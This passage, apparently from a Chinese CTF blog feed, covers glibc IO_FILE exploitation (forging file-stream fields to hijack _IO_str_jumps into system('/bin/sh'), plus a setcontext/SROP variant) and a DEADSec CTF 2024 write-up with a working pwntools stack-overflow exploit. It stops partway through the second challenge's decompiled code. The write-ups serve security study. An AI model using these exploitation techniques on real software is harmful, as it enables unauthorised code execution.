class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>一般有两个利用链：</p><ol><li>_IO_str_jumps -&gt; _IO_str_finish</li><li>_IO_str_jumps -&gt; _IO_str_overflow</li></ol><h5 id="IO-str-finish"><a href="#IO-str-finish" class="headerlink" title="_IO_str_finish"></a>_IO_str_finish</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _IO_str_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; <span class="number">1</span>))</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))fp + <span class="number">0xE8</span> ) (fp-&gt;_IO_buf_base); <span class="comment">// call qword ptr [fp+E8h]</span></span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个函数以<code>fp-&gt;_IO_buf_base</code>为参数执行了<code>fp+0xE8</code>处的函数。</p><p>需要满足:</p><ol><li>fp-&gt;_IO_buf_base !&#x3D; 0</li><li>fp-&gt;_flags为偶数</li></ol><p>这条链是exit来触发的，所以还需要满足_IO_flush_all_lockp的检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_IO_write_ptr &gt; fp-&gt; _IO_write_base</span><br><span class="line">fp-&gt; _mode &lt;= <span class="number">0</span></span><br></pre></td></tr></table></figure><p>所以要构造：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flag = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_base = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr = <span class="number">1</span></span><br><span class="line">fp-&gt;_IO_buf_base = str_binsh_addr</span><br><span class="line">fp-&gt;_mode = <span class="number">0</span></span><br><span class="line">fp+<span class="number">0xE8</span> = system_addr</span><br></pre></td></tr></table></figure><p>然后将目标文件流的vtable指向_IO_str_jumps-0x8来调用 _IO_str_finish（因为原本要调用的是 _IO_str_overflow，减去0x8即可指向 _IO_str_finish）</p><h5 id="IO-str-overflow"><a href="#IO-str-overflow" class="headerlink" title="_IO_str_overflow"></a>_IO_str_overflow</h5><p>这个函数比较复杂，不分析了，直接套用其他师傅的结论：以</p><p><code>2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100</code>为参数调用<code>fp+0xE0</code>处的函数。绕过条件需要满足：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flags &amp; <span class="number">8</span> == <span class="number">0</span>, (fp-&gt; _flags &amp; <span class="number">0xC00</span>) == <span class="number">0x400</span>, fp-&gt; _flags &amp; <span class="number">1</span> = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt; fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</span><br></pre></td></tr></table></figure><p>所以我们需要构造</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_flags = <span class="number">0</span></span><br><span class="line">_IO_write_base = <span class="number">0</span></span><br><span class="line">_IO_write_ptr = (binsh_in_libc_addr <span class="number">-100</span>) / <span class="number">2</span> +<span class="number">1</span></span><br><span class="line">_IO_buf_base = <span class="number">0</span></span><br><span class="line">_IO_buf_end = (binsh_in_libc_addr <span class="number">-100</span>) / <span class="number">2</span> </span><br><span class="line"></span><br><span class="line">_mode = <span class="number">-1</span></span><br><span class="line">fp+<span class="number">0xE0</span> = system_addr</span><br><span class="line">vtable = _IO_str_jumps - <span class="number">0x18</span></span><br></pre></td></tr></table></figure><h5 id="2-28"><a href="#2-28" class="headerlink" title="2.28"></a>2.28</h5><p>2.28版本之后上面两个利用链的函数指针被改为free，无法劫持其为system或ogg去实行攻击。2.35的代码为例对比观察一下就能发现问题了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从此往后的利用需要用到setcontext（2.29-2.31）和house of apple（2.31-2.39）。</p><p>这里先post一个师傅对setcontext的讲解，后面我在慢慢研究。</p><p>结合2.29版本后setcontex函数变化，观察汇编代码，_IO_str_overflow出现一些有趣的利用方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7e6eb4f &lt;__GI__IO_str_overflow+47&gt;:je     0x7ffff7e6ec80 &lt;__GI__IO_str_overflow+352&gt;</span><br><span class="line">0x7ffff7e6eb55 &lt;__GI__IO_str_overflow+53&gt;:mov    rdx,QWORD PTR [rdi+0x28]  &lt;----</span><br><span class="line">0x7ffff7e6eb59 &lt;__GI__IO_str_overflow+57&gt;:mov    r14,QWORD PTR [rbx+0x38]</span><br><span class="line">0x7ffff7e6eb5d &lt;__GI__IO_str_overflow+61&gt;:mov    r12,QWORD PTR [rbx+0x40]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在调用malloc之前，有一条指令讲rdi+0x28的值赋给了rdx，由于此时rdi指向IO_FILE_plus的头部，所以rdx的值为_IO_write_ptr</p><p>而在glibc2.29的版本上setcontext的利用从以前的rdi变为了rdx，因此攻击者可以通过这个位置来进行新版下的setcontext,进而实现<strong>srop</strong></p><p>步骤为</p><ol><li>控制malloc_hook为setcontext函数</li><li>进入io_str_overflow时首先将rdx赋值为填充了context的地址（此时同时满足了<code>fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= _IO_buf_end - _IO_buf_base</code>）</li><li>调用malloc触发malloc_hook中函数，控制程序执行</li></ol>]]></content>
    
    
    <summary type="html">glibc2.35，有特殊情况会说明。</summary>
    
    
    
    <category term="glibc源码补完计划" scheme="https://c-lby.top/categories/glibc%E6%BA%90%E7%A0%81%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/"/>
    
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="IO_FILE" scheme="https://c-lby.top/tags/IO-FILE/"/>
    
  </entry>
  
  <entry>
    <title>『DEADSec CTF 2024』 PWN WP</title>
    <link href="https://c-lby.top/2024/07/30/2024-deadsec-wp/"/>
    <id>https://c-lby.top/2024/07/30/2024-deadsec-wp/</id>
    <published>2024-07-29T16:23:43.000Z</published>
    <updated>2024-08-07T15:08:40.675Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-Super-CPP-Calc"><a href="#0x01-Super-CPP-Calc" class="headerlink" title="0x01 Super CPP Calc"></a>0x01 Super CPP Calc</h3><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>main函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">28</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  Calculator::Calculator((Calculator *)v3);</span><br><span class="line">  setup();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      banner();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">1337</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      Calculator::Backdoor((Calculator *)v3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt;= <span class="number">1337</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        Calculator::setnumber_floater((Calculator *)v3);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        Calculator::setnumber_integer((Calculator *)v3);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序应该是初始化了一个Calculator类，其中包含三个成员函数，并对成员变量进行了初始化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">Calculator::Calculator</span><span class="params">(Calculator *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  *(_DWORD *)this = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">3</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">5</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)this = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">3</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">5</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)this + <span class="number">6</span>) = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">Calculator::Backdoor</span><span class="params">(Calculator *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  __int64 buf[<span class="number">128</span>]; <span class="comment">// [rsp+10h] [rbp-400h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  result = *((<span class="type">unsigned</span> <span class="type">int</span> *)this + <span class="number">6</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Create note&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, *((<span class="type">int</span> *)this + <span class="number">6</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>backdoor中存在一个潜在的栈溢出，前提是能控制this+6大于0x410</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Calculator::setnumber_floater</span><span class="params">(Calculator *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Floater Calculator&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%f&quot;</span>, (<span class="type">char</span> *)this + <span class="number">12</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%f&quot;</span>, (<span class="type">char</span> *)this + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *((<span class="type">float</span> *)this + <span class="number">3</span>) &lt; <span class="number">0.0</span></span><br><span class="line">    || *((<span class="type">float</span> *)this + <span class="number">4</span>) &lt; <span class="number">0.0</span></span><br><span class="line">    || *((<span class="type">float</span> *)this + <span class="number">3</span>) &gt; <span class="number">10.0</span></span><br><span class="line">    || *((<span class="type">float</span> *)this + <span class="number">4</span>) &gt; <span class="number">10.0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No Hack&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)checkDecimalPlaces(*((<span class="type">float</span> *)this + <span class="number">3</span>)) != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *((_DWORD *)this + <span class="number">3</span>) = <span class="number">1065353216</span>;</span><br><span class="line">    *((_DWORD *)this + <span class="number">4</span>) = <span class="number">1065353216</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *((<span class="type">float</span> *)this + <span class="number">5</span>) = *((<span class="type">float</span> *)this + <span class="number">3</span>) / *((<span class="type">float</span> *)this + <span class="number">4</span>);</span><br><span class="line">  *((_DWORD *)this + <span class="number">6</span>) = (<span class="type">int</span>)*((<span class="type">float</span> *)this + <span class="number">5</span>);</span><br><span class="line">  result = *((<span class="type">unsigned</span> <span class="type">int</span> *)this + <span class="number">6</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)result &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (__int64)this;</span><br><span class="line">    --*((_DWORD *)this + <span class="number">6</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Calculator *__fastcall <span class="title function_">Calculator::setnumber_integer</span><span class="params">(Calculator *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  Calculator *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Integer Calculator&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, this);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, (<span class="type">char</span> *)this + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(<span class="type">int</span> *)this &lt; <span class="number">0</span> || *((<span class="type">int</span> *)this + <span class="number">1</span>) &lt; <span class="number">0</span> || *(<span class="type">int</span> *)this &gt; <span class="number">10</span> || *((<span class="type">int</span> *)this + <span class="number">1</span>) &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No Hack&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *((_DWORD *)this + <span class="number">2</span>) = *((_DWORD *)this + <span class="number">1</span>) + *(_DWORD *)this;</span><br><span class="line">  result = this;</span><br><span class="line">  *((_DWORD *)this + <span class="number">6</span>) = *((_DWORD *)this + <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入的数据限制了不能小于零不能大于十，那么整型加法就没法凑出需要的大小了。但是浮点数运算是除法，所以也许有机可乘。但是注意看运算中间有个检查，简单来讲就是检查this+3这个数的小数位数是否不为一，如果满足，则替换数字，这样运算出来的结果永远是1，显然我们要让第一个输入的数据小数位只有一个数，第二个数则无所谓。所以输入9.9和0.001就够大了。很简单的逻辑漏洞。注意一下栈平衡问题即可。</p><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r = remote(&#x27;34.122.93.62&#x27;, 31134)</span></span><br><span class="line">r = process(<span class="string">&#x27;CPPCalc&#x27;</span>)</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;9.9&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;0.001&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b *0x4018DC&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1337&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x408</span>+p64(<span class="number">0x401748</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x02-shadow"><a href="#0x02-shadow" class="headerlink" title="0x02 shadow"></a>0x02 shadow</h3><h5 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h5><p>题目环境是ubuntu22.04，即glibc2.35</p><p>我给部分函数更改了名字，并且写了一些注释方便理解。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 retaddr; <span class="comment">// [rsp+18h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  init1(retaddr);                               <span class="comment">// 产生了两个0x20的chunk，5380=2，此处参数的retaddr是一个libc的地址，是main函数的返回地址</span></span><br><span class="line">  setbuf();</span><br><span class="line">  chal(retaddr, (__int64)a2, v3);</span><br><span class="line">  RFG_chk(retaddr);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>RFG_chk</code>这个函数是根据我自己理解改的名字，最近刚好看了一点windows pwn的知识，其中有一个保护机制叫RFG，工作原理是保存当前栈帧的返回地址，并在函数返回时对比返回地址是否正确。这个程序里的<code>RFG_chk</code>就是手动实现了这个功能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *__fastcall <span class="title function_">init1</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rcx</span></span><br><span class="line">  _QWORD *result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  *v4 = a1;</span><br><span class="line">  v4[<span class="number">1</span>] = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  v1 = count++;</span><br><span class="line">  v2 = v1;</span><br><span class="line">  result = v4;</span><br><span class="line">  chunk_list[v2] = v4;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">chal</span><span class="params">(__int64 a1, __int64 *a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 *v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v6[<span class="number">2</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  __int64 retaddr; <span class="comment">// [rsp+28h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  v6[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6[<span class="number">0</span>] = <span class="number">2LL</span>;</span><br><span class="line">  v3 = (__int64 *)retaddr;</span><br><span class="line">  init1(retaddr);                               <span class="comment">// 又产生了两个chunk</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  